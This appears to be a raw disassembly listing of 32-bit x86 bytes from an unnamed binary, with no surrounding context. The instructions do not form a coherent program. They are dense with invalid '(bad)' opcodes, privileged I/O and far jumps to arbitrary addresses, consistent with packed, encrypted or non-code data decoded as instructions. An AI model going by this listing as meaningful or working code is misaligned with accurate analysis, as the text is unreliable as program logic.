  4070ea:	pop    ebp
  4070eb:	push   esi
  4070ec:	jbe    0x4070f5
  4070ee:	mov    dh,0xfe
  4070f0:	imul   eax,DWORD PTR [edx],0xffffff96
  4070f3:	adc    ebp,esp
  4070f5:	push   ecx
  4070f6:	sbb    eax,0x77542de7
  4070fb:	mov    ebp,0x9aa6f53c
  407100:	repz leave 
  407102:	outs   dx,DWORD PTR ds:[esi]
  407103:	pop    edx
  407104:	add    dl,BYTE PTR [ebx-0x53d05ba1]
  40710a:	adc    edx,DWORD PTR [ebp+edx*1+0x2a]
  40710e:	call   0x3964:0xec6887f1
  407115:	adc    BYTE PTR [ebx+0xaab4055],0x3b
  40711c:	dec    edi
  40711d:	xchg   BYTE PTR [eax],cl
  40711f:	pusha  
  407120:	lods   al,BYTE PTR ds:[esi]
  407121:	cmp    ecx,DWORD PTR ds:0xc7832c08
  407127:	inc    eax
  407128:	push   ebx
  407129:	xchg   esi,eax
  40712a:	cli    
  40712b:	enter  0x1e75,0x6c
  40712f:	xor    al,0x25
  407131:	cmp    BYTE PTR [ebx-0x172e0d4f],0x3e
  407138:	test   eax,0xff1dd7ed
  40713d:	inc    eax
  40713e:	adc    DWORD PTR [edx-0x3f],ebp
  407141:	sar    DWORD PTR [ebx+edx*4],1
  407144:	clc    
  407145:	inc    edx
  407146:	mov    DWORD PTR [esi-0x5c2b1108],edi
  40714c:	dec    eax
  40714d:	retf   0x26aa
  407150:	lods   al,BYTE PTR ds:[esi]
  407151:	hlt    
  407152:	sbb    DWORD PTR [esi],ecx
  407154:	shl    BYTE PTR [ecx],cl
  407156:	adc    DWORD PTR [ebp+0x14],edx
  407159:	ss daa 
  40715b:	ret    
  40715c:	mov    al,0x4
  40715e:	jo     0x407156
  407160:	jle    0x407127
  407162:	sbb    ecx,ebx
  407164:	push   esi
  407165:	jge    0x4071c7
  407167:	cmp    eax,DWORD PTR [esi-0x5e4539e]
  40716d:	fld    TBYTE PTR [edx-0x67]
  407170:	stc    
  407171:	push   ebx
  407172:	mov    WORD PTR [ebx-0x40],cs
  407175:	mov    esi,0xf9b5572
  40717a:	repz jmp 0x728a:0xc90e7db2
  407182:	jb     0x40715a
  407184:	out    dx,al
  407185:	gs pop ss
  407187:	aam    0x5b
  407189:	sbb    al,0xcf
  40718c:	test   eax,0x70c47fe2
  407191:	mov    ah,0x5a
  407193:	xor    al,0x63
  407195:	cmp    ch,ch
  407197:	jmp    0x4071fa
  407199:	jns    0x4071e5
  40719b:	inc    edx
  40719c:	dec    edi
  40719d:	pop    eax
  40719e:	in     eax,dx
  40719f:	arpl   WORD PTR [ecx+0x5c],dx
  4071a2:	sub    al,0xe2
  4071a4:	lds    esi,FWORD PTR [eax]
  4071a6:	pop    ebp
  4071a7:	(bad)  
  4071a8:	in     al,0x10
  4071aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071ab:	fs and eax,0x1143b068
  4071b1:	lods   al,BYTE PTR ds:[esi]
  4071b2:	fild   QWORD PTR [eax-0x6]
  4071b5:	nop
  4071b6:	in     al,dx
  4071b7:	pop    ds
  4071b8:	sahf   
  4071b9:	(bad)  
  4071bb:	(bad)  
  4071bc:	hlt    
  4071bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071be:	enter  0xe2b3,0x3f
  4071c2:	jbe    0x40723d
  4071c4:	jg     0x407198
  4071c6:	xor    ebp,esi
  4071c8:	sub    eax,0xd7019582
  4071cd:	mov    al,0xc7
  4071cf:	or     DWORD PTR [ecx-0xa],0xffffffdc
  4071d3:	jge    0x407218
  4071d5:	retf   
  4071d6:	shr    DWORD PTR [ebp+0x2d],1
  4071d9:	rcl    dl,0x63
  4071dc:	inc    ecx
  4071dd:	lds    eax,FWORD PTR [edx]
  4071df:	scas   al,BYTE PTR es:[edi]
  4071e0:	lock out dx,eax
  4071e2:	xor    DWORD PTR [ebp+0x47],edi
  4071e5:	xor    DWORD PTR [edi+0x1143a8e4],edi
  4071eb:	sbb    DWORD PTR [esi+0x4ca8c922],esp
  4071f1:	dec    ecx
  4071f2:	clc    
  4071f3:	jg     0x407221
  4071f5:	push   0xffffffeb
  4071f7:	pop    ds
  4071f8:	xor    BYTE PTR [esi+ebp*1],dl
  4071fb:	push   0x1b
  4071fd:	inc    esi
  4071fe:	xchg   DWORD PTR [edi],edx
  407200:	sbb    esi,DWORD PTR [eax-0x35eb7594]
  407206:	in     eax,0xc5
  407208:	mov    dh,0x8f
  40720a:	dec    esi
  40720b:	or     esp,DWORD PTR [ecx]
  40720d:	dec    eax
  40720e:	and    DWORD PTR gs:[esi+ebp*1-0x60],ecx
  407213:	cmp    bh,ch
  407215:	sub    ebx,DWORD PTR [eax+ebx*8-0xf]
  407219:	add    DWORD PTR [eax-0x32aa6529],0x7c508c56
  407223:	and    al,0x3f
  407225:	push   cs
  407226:	test   al,0x2
  407228:	pusha  
  407229:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40722a:	hlt    
  40722b:	jp     0x407257
  40722d:	mov    ds:0x97d11e73,al
  407232:	js     0x40722c
  407234:	rcl    DWORD PTR [eax+0x4817cfc2],cl
  40723a:	lahf   
  40723b:	jmp    0x78c0ee2a
  407240:	inc    ebx
  407241:	cmovp  edi,DWORD PTR [ebp-0x1784d04c]
  407248:	iret   
  407249:	xchg   ecx,edx
  40724b:	call   FWORD PTR [eax-0x5aae9f46]
  407251:	sub    DWORD PTR [ebx],ecx
  407253:	mov    dh,0xfa
  407255:	mov    al,BYTE PTR [eax]
  407257:	jne    0x407202
  407259:	dec    ebx
  40725a:	adc    DWORD PTR ds:0x5f033f88,esi
  407260:	loopne 0x4072ad
  407262:	jnp    0x4072b8
  407264:	sub    ebx,eax
  407266:	fs jns 0x407252
  407269:	test   cl,bl
  40726b:	nop
  40726c:	(bad)
  40726f:	and    bh,dl
  407271:	shl    DWORD PTR [edx+0xdcda51c],1
  407277:	adc    DWORD PTR [ebp+0x2563cd9d],0x34ca5819
  407281:	call   0x946a1c34
  407286:	out    0x46,eax
  407288:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407289:	leave  
  40728a:	in     eax,0x90
  40728c:	add    al,0x22
  40728e:	mov    ebp,0x9274d70b
  407293:	addr16 pop ds
  407295:	outs   dx,DWORD PTR ds:[esi]
  407296:	cld    
  407297:	cmp    al,0x53
  407299:	jmp    FWORD PTR [edx-0x4ded7880]
  40729f:	(bad)  
  4072a1:	sub    al,0x41
  4072a3:	pop    edi
  4072a4:	xor    ah,BYTE PTR [ebx+0x29da1419]
  4072aa:	sub    dh,cl
  4072ac:	lods   al,BYTE PTR ds:[esi]
  4072ad:	fsub   DWORD PTR [edx-0x34e77e55]
  4072b3:	mov    DWORD PTR [edx-0x54],esp
  4072b6:	nop
  4072b7:	xchg   esi,eax
  4072b8:	(bad)  
  4072b9:	dec    ecx
  4072ba:	jbe    0x407249
  4072bc:	(bad)
  4072c0:	ds jmp 0xbce0:0x3d1c241
  4072c8:	fidivr WORD PTR [esi-0x4da012cd]
  4072ce:	xchg   BYTE PTR [ebx+0x7b],cl
  4072d1:	jb     0x4072d2
  4072d3:	jae    0x407275
  4072d5:	adc    eax,0x1c841dd4
  4072da:	nop
  4072db:	jmp    FWORD PTR [ebx+ebp*2+0x4d]
  4072df:	push   edi
  4072e0:	test   eax,0xc72bf21f
  4072e5:	ret    0x8c7f
  4072e8:	sub    dh,BYTE PTR [esi+0x2db2b903]
  4072ee:	push   ebx
  4072ef:	scas   eax,DWORD PTR es:[edi]
  4072f0:	test   eax,0x631d7d0a
  4072f5:	repnz lock and bl,cl
  4072f9:	mov    eax,0x73d52896
  4072fe:	shl    BYTE PTR [ecx+ebp*8+0x2fbcad1b],1
  407305:	(bad)  
  407306:	xor    eax,esi
  407308:	xchg   esp,eax
  407309:	mov    esp,0xbc105b24
  40730e:	int    0x3a
  407310:	adc    cl,BYTE PTR ds:0x9e8aba83
  407316:	std    
  407317:	rcl    BYTE PTR [ecx+0x46],cl
  40731a:	loop   0x4072ca
  40731c:	push   0xffffffcb
  40731e:	push   0xffffffb2
  407320:	cmp    BYTE PTR [esi-0x7adae126],ch
  407326:	lods   al,BYTE PTR ds:[esi]
  407327:	std    
  407328:	outs   dx,BYTE PTR ds:[esi]
  407329:	leave  
  40732a:	or     ch,BYTE PTR [eax-0x49334b10]
  407330:	icebp  
  407331:	leave  
  407332:	dec    edi
  407333:	(bad)  
  407334:	fst    DWORD PTR ds:0x14d5a653
  40733a:	jmp    0x9821969f
  40733f:	sub    DWORD PTR [edi+0x6e],edi
  407342:	push   ecx
  407343:	fadd   st(1),st
  407345:	scas   al,BYTE PTR es:[edi]
  407346:	in     eax,0xac
  407348:	enter  0xa121,0xa7
  40734c:	inc    ecx
  40734d:	sub    cl,bh
  40734f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407350:	aad    0xe9
  407352:	inc    eax
  407353:	and    BYTE PTR [esi+0x4],ch
  407356:	into   
  407357:	lock mov edi,0x54ae26ba
  40735d:	sub    eax,0xee52b288
  407362:	xor    eax,0x871fdd42
  407367:	mov    eax,ebp
  407369:	adc    bh,BYTE PTR [edx+0x129f7c6c]
  40736f:	sbb    al,0x1a
  407371:	sub    BYTE PTR [eax+0x6b],ch
  407374:	bound  edi,QWORD PTR [eax-0x352fd71b]
  40737a:	gs add edx,ebx
  40737d:	ret    0xa7c4
  407380:	ret    
  407381:	enterw 0x1459,0xec
  407386:	dec    edi
  407387:	xor    BYTE PTR [eax-0x2b],dl
  40738a:	hlt    
  40738b:	fadd   DWORD PTR [esi+0x7c6ed2d5]
  407391:	mov    al,0x9b
  407393:	jae    0x40737d
  407395:	cmp    eax,0xa58a0e76
  40739a:	jnp    0x40736c
  40739c:	mov    ebx,0x26b5794b
  4073a1:	shl    dl,cl
  4073a3:	ins    BYTE PTR es:[edi],dx
  4073a4:	dec    edi
  4073a5:	and    bh,0xa4
  4073a8:	outs   dx,BYTE PTR ds:[esi]
  4073a9:	mov    BYTE PTR [ebp+0x4db7e74d],cl
  4073af:	inc    esp
  4073b0:	xor    eax,DWORD PTR [esi+0x580b1606]
  4073b6:	jge    0x4073cd
  4073b8:	fild   QWORD PTR [edx+0x5914d512]
  4073be:	out    0x4f,eax
  4073c0:	bound  eax,QWORD PTR [eax+0xa]
  4073c3:	pop    edx
  4073c4:	jne    0x4073e5
  4073c6:	xchg   edi,eax
  4073c7:	cmc    
  4073c8:	sub    DWORD PTR ds:0x59d8fcc1,ecx
  4073ce:	ds pop esp
  4073d0:	ret    
  4073d1:	jns    0x407428
  4073d3:	jge    0x40739d
  4073d5:	cli    
  4073d6:	push   0xb2081674
  4073db:	and    dh,BYTE PTR [eax-0x49e97eba]
  4073e1:	jmp    0x55d3:0xcedcfb60
  4073e8:	ds fs ins BYTE PTR es:[edi],dx
  4073eb:	shl    DWORD PTR [ecx+0x72],1
  4073ee:	jnp    0x407432
  4073f0:	idiv   DWORD PTR [edx-0x2]
  4073f3:	in     eax,dx
  4073f4:	leave  
  4073f5:	pop    edi
  4073f6:	cli    
  4073f7:	call   0x506dc30d
  4073fc:	(bad)  
  4073fd:	jo     0x4073b1
  4073ff:	(bad)  
  407400:	pop    ds
  407401:	jmp    0xbdc82cf8
  407406:	dec    esi
  407407:	je     0x407393
  407409:	jns    0x407453
  40740b:	(bad)  
  40740c:	fistp  QWORD PTR [esi]
  40740e:	sbb    ebp,DWORD PTR [esi-0x53]
  407411:	xchg   ebx,esp
  407413:	frstor [ecx+esi*4+0x5ba6e5f2]
  40741a:	sub    DWORD PTR [ebp-0x6d],edi
  40741d:	push   cs
  40741e:	sub    BYTE PTR [edx+0x35987fd5],dh
  407424:	in     eax,0xee
  407426:	jge    0x407472
  407428:	jno    0x40747d
  40742a:	data16 mov ds:0xff1b146d,al
  407430:	sbb    al,BYTE PTR [edx]
  407432:	inc    edx
  407433:	jb     0x4073cf
  407435:	ins    BYTE PTR es:[edi],dx
  407436:	scas   eax,DWORD PTR es:[edi]
  407437:	call   0x69f9:0x1584dc21
  40743e:	bound  esi,QWORD PTR fs:[edx]
  407441:	daa    
  407442:	sub    cl,BYTE PTR [ecx-0x10]
  407445:	xchg   ebx,eax
  407446:	(bad)  
  407447:	call   FWORD PTR [esi]
  407449:	or     BYTE PTR [esi-0x3850fd21],bh
  40744f:	ror    ah,cl
  407451:	lods   al,BYTE PTR ds:[esi]
  407452:	xchg   edi,eax
  407453:	jns    0x4074bd
  407455:	push   ebx
  407456:	jno    0x407442
  407458:	out    0x23,al
  40745a:	push   esp
  40745b:	pop    ebx
  40745c:	ins    BYTE PTR es:[edi],dx
  40745d:	pop    esi
  40745e:	ret    0x49a7
  407461:	ret    0x3a6
  407464:	out    dx,al
  407465:	and    BYTE PTR [ecx+0x7c],cl
  407468:	sti    
  407469:	pop    esp
  40746a:	loope  0x4074d2
  40746c:	inc    esi
  40746d:	jmp    0x3b9c1061
  407472:	cdq    
  407473:	lea    eax,[edi]
  407475:	test   BYTE PTR [esi+0xe91233],bl
  40747b:	cmp    eax,0x961bd64d
  407480:	mov    ebp,0x71b74f7f
  407485:	inc    edi
  407486:	push   edx
  407487:	lock push esi
  407489:	cld    
  40748a:	mov    DWORD PTR [eax+0x5cd25d49],esp
  407490:	pop    esi
  407491:	mov    DWORD PTR [ebp+0x4a],edi
  407494:	scas   al,BYTE PTR es:[edi]
  407495:	cmp    eax,0xd68b1e02
  40749a:	mov    esp,0xe2c8f35f
  40749f:	retf   
  4074a0:	dec    edi
  4074a1:	cmp    dl,BYTE PTR [ebx-0x5a982908]
  4074a7:	dec    esi
  4074a8:	sbb    cl,BYTE PTR [ebx+0x1bbdeb2c]
  4074ae:	shl    BYTE PTR [edi-0x1ac50910],0xef
  4074b5:	cmp    eax,0x71174834
  4074ba:	in     al,0xd0
  4074bc:	cmp    edi,esp
  4074be:	pop    esp
  4074bf:	lods   al,BYTE PTR ds:[esi]
  4074c0:	sub    BYTE PTR [eax+0x5c699575],ch
  4074c6:	mov    ch,0x68
  4074c8:	pop    edi
  4074c9:	mov    al,0x95
  4074cb:	sub    BYTE PTR [ecx+eax*1-0x2e],al
  4074cf:	int    0x2
  4074d1:	mov    edi,0xe5342711
  4074d6:	je     0x407481
  4074d8:	jg     0x407472
  4074da:	push   ebx
  4074db:	stos   BYTE PTR es:[edi],al
  4074dc:	mov    ds:0x490719b0,al
  4074e1:	mov    ch,BYTE PTR [ebp+0x3b9ec505]
  4074e7:	inc    ecx
  4074e8:	ds mov ebp,0xc6dd99b2
  4074ee:	aad    0x9c
  4074f0:	pop    ds
  4074f1:	xchg   DWORD PTR [esi-0x7e1afbc7],edx
  4074f7:	dec    ebx
  4074f8:	call   FWORD PTR [edi]
  4074fa:	sbb    BYTE PTR [ecx+0x21],ah
  4074fd:	xchg   BYTE PTR [esi+0x7a],cl
  407500:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407501:	fistp  DWORD PTR [ebx+0x6f]
  407504:	push   esi
  407505:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407506:	test   BYTE PTR [ebx],dl
  407508:	into   
  407509:	mov    esp,0x4ae373e2
  40750e:	inc    ebp
  40750f:	out    0x81,al
  407511:	xor    eax,0x5d3d6454
  407516:	enter  0xc237,0xa2
  40751a:	call   0x3d0a6fe
  40751f:	or     DWORD PTR [ebx],ebx
  407521:	dec    ebp
  407522:	dec    ecx
  407523:	in     al,0xb1
  407525:	mov    bl,0x0
  407527:	test   al,0xae
  407529:	cmp    ecx,DWORD PTR [edx+0x164ec521]
  40752f:	cs push 0x3a0e9604
  407535:	test   DWORD PTR [edx+0x422c6d8a],eax
  40753b:	loop   0x4074c9
  40753d:	shr    BYTE PTR [esi],1
  40753f:	loop   0x407569
  407541:	push   esp
  407542:	mov    esi,0x1ce2b7e9
  407547:	jecxz  0x407567
  407549:	push   esp
  40754a:	mov    edi,0xa7d6ac93
  40754f:	pop    es
  407550:	xchg   bl,ch
  407552:	mov    al,0x93
  407554:	call   0x4bafc875
  407559:	jno    0x407510
  40755b:	jl     0x4075b2
  40755d:	dec    ebx
  40755e:	(bad)  [edx-0x36]
  407561:	sub    eax,DWORD PTR [edi-0x12]
  407564:	xor    edi,DWORD PTR [eax]
  407566:	ss icebp 
  407568:	ss out 0x16,al
  40756b:	scas   eax,DWORD PTR es:[edi]
  40756c:	mov    cl,bh
  40756e:	sbb    DWORD PTR [eax-0x39],esp
  407571:	js     0x407508
  407573:	sub    eax,0x7cd181eb
  407578:	mov    edi,edx
  40757a:	lea    esi,[eax+eiz*8+0x2d246f75]
  407581:	xchg   esp,eax
  407582:	sbb    al,0xbd
  407584:	jl     0x4075f3
  407586:	inc    eax
  407587:	inc    ecx
  407588:	ret    0x9517
  40758b:	xchg   esp,eax
  40758c:	out    dx,al
  40758d:	call   0x8251cebc
  407592:	mul    BYTE PTR [ebx]
  407594:	jno    0x40757e
  407596:	cmp    eax,0xba376398
  40759b:	xchg   edx,eax
  40759c:	loopne 0x4075e5
  40759e:	inc    eax
  40759f:	into   
  4075a0:	xchg   ebp,eax
  4075a1:	mov    al,BYTE PTR [ecx+0x43f865d6]
  4075a7:	sub    BYTE PTR [eax+0x5e96ff20],0xe6
  4075ae:	push   ss
  4075af:	(bad)  
  4075b0:	add    cl,BYTE PTR [esi+0x50]
  4075b3:	or     dh,BYTE PTR [edx]
  4075b5:	enter  0xd5a8,0x2f
  4075b9:	std    
  4075ba:	adc    eax,0xfa1659f6
  4075bf:	fcom   st(2)
  4075c1:	mov    ch,0xf4
  4075c3:	mov    ecx,DWORD PTR ds:0x855dbe99
  4075c9:	sbb    dl,0x7e
  4075cc:	sub    ah,dl
  4075ce:	mov    edi,0xb3feb059
  4075d3:	sub    ecx,DWORD PTR [ebx+0x50]
  4075d6:	jmp    0x40763d
  4075d8:	ffreep st(7)
  4075da:	xor    esi,edi
  4075dc:	fidiv  DWORD PTR cs:[ebp+edi*1-0x322390c9]
  4075e4:	lods   eax,DWORD PTR ds:[esi]
  4075e5:	cmp    DWORD PTR [ebp+ebp*4+0x2b],esp
  4075e9:	xor    eax,0xb8f31ce3
  4075ee:	mov    esp,0xd3b93eda
  4075f3:	loop   0x40757a
  4075f5:	sub    esi,DWORD PTR [edi-0x65]
  4075f8:	lods   eax,DWORD PTR ds:[esi]
  4075f9:	jmp    0xb063ef32
  4075fe:	cmp    BYTE PTR [edx+eiz*4],bl
  407601:	sub    DWORD PTR [edi+eiz*2-0x3e1871bc],edi
  407608:	xor    eax,0x4ae33a15
  40760d:	cmp    al,0x37
  40760f:	retf   0x3c6
  407612:	and    BYTE PTR [edi+0x4ec7876f],0xec
  407619:	or     DWORD PTR [edx-0x7b],esp
  40761c:	out    dx,al
  40761d:	lahf   
  40761e:	xor    bh,dl
  407620:	icebp  
  407621:	sub    dh,BYTE PTR [ebx+esi*2-0x6178b424]
  407628:	jo     0x4075dc
  40762a:	xlat   BYTE PTR ds:[ebx]
  40762b:	push   0x59e351c2
  407630:	sub    al,0xe8
  407632:	push   edi
  407633:	xor    eax,ecx
  407635:	add    bh,BYTE PTR ds:0x99e429c8
  40763b:	ja     0x40764b
  40763d:	or     eax,0x164669cf
  407642:	mov    esp,0xf5e0ed32
  407647:	mul    BYTE PTR [ecx-0x44]
  40764a:	popa   
  40764b:	fwait
  40764c:	nop    ecx
  40764f:	bt     DWORD PTR [eax+ecx*4+0x3a],esp
  407654:	(bad)  
  407655:	shl    BYTE PTR [ecx+0x4e44e3a0],1
  40765b:	cmp    esi,ecx
  40765d:	mov    esi,DWORD PTR [esi+0x7b5b42e6]
  407663:	leave  
  407664:	mov    ebx,0x635c112a
  407669:	push   es
  40766a:	inc    edx
  40766b:	cmc    
  40766c:	or     dh,BYTE PTR [ebx]
  40766e:	jmp    0x407658
  407670:	icebp  
  407671:	push   0xffffffeb
  407673:	push   esp
  407674:	sub    BYTE PTR ds:0xea62a1ce,cl
  40767a:	js     0x407696
  40767c:	shl    DWORD PTR [ebx+eax*4-0x664e8cb8],0x95
  407684:	push   ecx
  407685:	mov    edx,0x2abdbc79
  40768a:	repnz lahf 
  40768c:	loopne 0x407693
  40768e:	cdq    
  40768f:	aad    0xca
  407691:	mov    ecx,0x371fba46
  407696:	test   eax,0xafdd72bc
  40769b:	inc    esi
  40769c:	jle    0x407684
  40769e:	sbb    ebp,ebp
  4076a0:	and    ecx,ebx
  4076a2:	add    eax,DWORD PTR [ebx-0x70]
  4076a5:	fld    TBYTE PTR [edx+edx*4]
  4076a8:	in     al,dx
  4076a9:	icebp  
  4076aa:	popf   
  4076ab:	sub    ebp,edx
  4076ad:	stc    
  4076ae:	mov    esi,0xb0299e4b
  4076b3:	mov    esi,0xf36339a2
  4076b8:	adc    BYTE PTR [ebx],ah
  4076ba:	repz ret 0x64ef
  4076be:	jns    0x66931ff
  4076c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076c5:	dec    eax
  4076c6:	retf   
  4076c7:	dec    edx
  4076c8:	sub    eax,DWORD PTR [edx+edx*8-0x7f]
  4076cc:	pop    ds
  4076cd:	xor    bl,bh
  4076cf:	xchg   ecx,eax
  4076d0:	sub    BYTE PTR [eax+0x71],bh
  4076d3:	mov    ebp,DWORD PTR [edi-0x6d]
  4076d6:	push   ds
  4076d7:	repnz imul eax,DWORD PTR [eax+ebx*8-0x24],0x2a
  4076dd:	mov    bh,0xaa
  4076df:	out    dx,eax
  4076e0:	stos   DWORD PTR es:[edi],eax
  4076e1:	or     BYTE PTR ds:0xb10d6abb,al
  4076e7:	mov    ecx,0x8d4959eb
  4076ec:	mov    ds,WORD PTR [edi-0x1c2edab9]
  4076f2:	sbb    DWORD PTR [ebx-0x7a0cf8c6],esp
  4076f8:	mov    edi,0x3e294db
  4076fd:	xchg   ecx,eax
  4076fe:	xacquire xchg DWORD PTR [ecx+esi*1],ebp
  407702:	sub    BYTE PTR [ebx+0x77],bh
  407705:	ss pop esi
  407707:	mov    edx,0xe1b11d47
  40770c:	dec    edx
  40770d:	pop    ecx
  40770e:	in     al,dx
  40770f:	jo     0x4076f7
  407711:	cdq    
  407712:	mov    edi,0xd4a7f110
  407717:	xchg   edi,eax
  407718:	push   ebp
  407719:	rcl    edx,0xa9
  40771c:	cmp    DWORD PTR [esi+ecx*4-0x1b3ac46f],ebp
  407723:	xchg   edi,eax
  407724:	or     BYTE PTR [edx+0x26],al
  407727:	push   ds
  407728:	dec    bp
  40772a:	jb     0x40774b
  40772c:	and    DWORD PTR [ebx],eax
  40772e:	cmc    
  40772f:	cmp    ebx,0x3e
  407732:	pop    edi
  407733:	ds pop esi
  407735:	ja     0x40773a
  407737:	int    0x6b
  407739:	out    dx,al
  40773a:	jp     0x407794
  40773c:	sub    DWORD PTR [ecx],esi
  40773e:	push   ebp
  40773f:	stos   DWORD PTR es:[edi],eax
  407740:	loope  0x407767
  407742:	(bad)
  407745:	arpl   WORD PTR [edx],ax
  407747:	or     dh,BYTE PTR [ebp+0x3c]
  40774a:	dec    eax
  40774b:	test   BYTE PTR [edi-0x7],dh
  40774e:	clc    
  40774f:	mov    esp,0xe75a4c72
  407754:	fs xchg edx,eax
  407756:	jno    0x407747
  407758:	add    BYTE PTR [ecx+edx*4],ah
  40775b:	repnz cmc 
  40775d:	jnp    0x407744
  40775f:	jbe    0x4076f1
  407761:	sub    BYTE PTR [edx-0x1d0bf0c],ah
  407767:	cld    
  407768:	mov    edi,DWORD PTR [eax]
  40776a:	stos   DWORD PTR es:[edi],eax
  40776b:	retf   
  40776c:	pop    ebx
  40776d:	call   0x23f0:0x4f904fa6
  407774:	pop    esp
  407775:	iret   
  407776:	rol    BYTE PTR [eax-0x4e6b90c6],cl
  40777c:	fcmovu st,st(2)
  40777e:	(bad)  
  40777f:	sub    DWORD PTR [ecx-0x20],ebx
  407782:	adc    eax,0xcf1b8d8f
  407787:	inc    esp
  407788:	cmp    al,0x6f
  40778a:	inc    edi
  40778b:	jp     0x4077ab
  40778d:	adc    al,0x32
  40778f:	sbb    BYTE PTR [esi+0x1b],bl
  407792:	or     al,0xd6
  407794:	or     BYTE PTR [ebp+0x6b],bl
  407797:	push   ebp
  407798:	and    al,0x1e
  40779a:	ss cmp al,0x90
  40779d:	add    BYTE PTR [edx+0x37],dl
  4077a0:	call   0x144b:0x5c61e0dc
  4077a7:	cld    
  4077a8:	ins    BYTE PTR es:[edi],dx
  4077a9:	mov    ebp,0x5a18bbce
  4077ae:	scas   eax,DWORD PTR es:[edi]
  4077af:	mov    ecx,DWORD PTR [ecx]
  4077b1:	inc    BYTE PTR [eax]
  4077b3:	sbb    BYTE PTR [eax+0x5b],bh
  4077b6:	pop    esi
  4077b7:	test   DWORD PTR [edi+eiz*8-0x5fad496d],edx
  4077be:	leave  
  4077bf:	popf   
  4077c0:	clc    
  4077c1:	push   ss
  4077c2:	shl    BYTE PTR [ebp-0x6cc93d4d],0x24
  4077c9:	cs stos BYTE PTR es:[edi],al
  4077cb:	and    esi,DWORD PTR [edx-0x71]
  4077ce:	xor    eax,0x3717913c
  4077d3:	xchg   DWORD PTR [edi],ecx
  4077d5:	adc    edx,eax
  4077d7:	sub    DWORD PTR [edi+0x18],ebp
  4077da:	cmp    al,0xde
  4077dc:	aaa    
  4077dd:	loopne 0x4077e1
  4077df:	or     bl,BYTE PTR [eax-0x5e41ea63]
  4077e5:	sbb    al,0xd2
  4077e7:	mov    bh,0x2f
  4077e9:	scas   al,BYTE PTR es:[edi]
  4077ea:	mov    ebp,0x9088cd83
  4077ef:	in     eax,dx
  4077f0:	push   es
  4077f1:	pushf  
  4077f2:	stos   BYTE PTR es:[edi],al
  4077f3:	iret   
  4077f4:	addr16 inc ebp
  4077f6:	test   BYTE PTR [ecx+0xdbde3cc],0x3b
  4077fd:	sbb    al,0x6a
  4077ff:	mov    eax,ds:0xd316a8a4
  407804:	jnp    0x40785c
  407806:	xchg   ebp,eax
  407807:	sub    DWORD PTR [bx+di+0x57],ecx
  40780b:	sbb    al,0x62
  40780d:	repz xor al,0xd7
  407810:	jl     0x4077fb
  407812:	xorps  xmm0,XMMWORD PTR [ecx+0x70]
  407816:	jb     0x407868
  407818:	and    ch,al
  40781a:	(bad)  
  40781e:	and    dh,BYTE PTR [ebp+0x1749fb0c]
  407824:	aaa    
  407825:	retf   0xb743
  407828:	icebp  
  407829:	and    ah,BYTE PTR [bx+si]
  40782c:	stos   BYTE PTR es:[edi],al
  40782d:	cs in  al,0xe
  407830:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407831:	or     ah,BYTE PTR [edx+0x28]
  407834:	push   0x96876dd9
  407839:	ret    0xc210
  40783c:	jmp    0xefc:0xeb820e2c
  407843:	rcl    dh,cl
  407845:	mov    ecx,0x1b8e093f
  40784a:	dec    eax
  40784b:	js     0x40787f
  40784d:	xchg   esp,ecx
  40784f:	stos   DWORD PTR es:[edi],eax
  407850:	jns    0x407880
  407852:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407853:	mov    ecx,0x35f76ed2
  407858:	pop    esi
  407859:	mov    gs,WORD PTR [edi]
  40785b:	jo     0x407886
  40785d:	cs xchg ecx,eax
  40785f:	loopne 0x40780b
  407861:	out    0xdf,al
  407863:	add    al,0x74
  407865:	dec    esp
  407866:	in     al,0x28
  407868:	push   edx
  407869:	cld    
  40786a:	test   edx,edx
  40786c:	jnp    0x407873
  40786e:	outs   dx,BYTE PTR ds:[esi]
  40786f:	sub    BYTE PTR [esi-0x2f],0x7f
  407873:	jne    0x40786d
  407875:	xchg   edi,eax
  407876:	add    bh,BYTE PTR [esi+0x23db42d7]
  40787c:	xor    al,0x56
  40787e:	add    BYTE PTR [esi],bl
  407880:	fmul   DWORD PTR [ecx-0x54bbd71d]
  407886:	xchg   ebp,eax
  407887:	cmp    bh,dh
  407889:	cs dec edx
  40788b:	mov    WORD PTR [ecx+0x41],?
  40788e:	outs   dx,DWORD PTR ds:[esi]
  40788f:	add    eax,0x1c1da1b2
  407894:	inc    ebx
  407895:	push   0x3a
  407897:	push   edi
  407898:	rcl    ch,1
  40789a:	ror    edx,cl
  40789c:	push   ebx
  40789d:	mov    ch,0xea
  40789f:	push   0xffffff83
  4078a1:	mov    ds:0x8ff05136,eax
  4078a6:	in     eax,dx
  4078a7:	or     al,0x49
  4078a9:	les    edi,FWORD PTR [bp+di-0x7a]
  4078ad:	add    DWORD PTR [edx+0x54],esi
  4078b0:	shl    BYTE PTR [ebp-0x6a87feaf],0xcf
  4078b7:	in     al,0x8f
  4078b9:	adc    eax,0x3ddd705
  4078be:	mov    DWORD PTR [edi],ebp
  4078c0:	mov    esp,0xc6c4b28c
  4078c5:	pop    esi
  4078c6:	cmc    
  4078c7:	xchg   BYTE PTR [eax-0x5ba9de6f],ch
  4078cd:	xchg   ebp,eax
  4078ce:	push   ecx
  4078cf:	pop    edi
  4078d0:	loop   0x407894
  4078d2:	aas    
  4078d3:	pop    esi
  4078d4:	pop    esp
  4078d5:	mov    ebp,0x58fc04e1
  4078da:	push   ds
  4078db:	(bad)  
  4078dc:	outs   dx,DWORD PTR ds:[esi]
  4078dd:	popf   
  4078de:	or     DWORD PTR [esi],ecx
  4078e0:	push   edi
  4078e1:	xchg   BYTE PTR [edx+0x37e358bc],dl
  4078e7:	jle    0x40795b
  4078e9:	sub    DWORD PTR ds:0x9e6df3a6,esi
  4078ef:	ror    BYTE PTR ds:0x7d76815c,0xf8
  4078f6:	ret    
  4078f7:	xlat   BYTE PTR ds:[ebx]
  4078f8:	xchg   edx,eax
  4078f9:	mov    WORD PTR [edi],ss
  4078fb:	add    BYTE PTR [ebx],cl
  4078fd:	jbe    0x407914
  4078ff:	mov    bl,0x7f
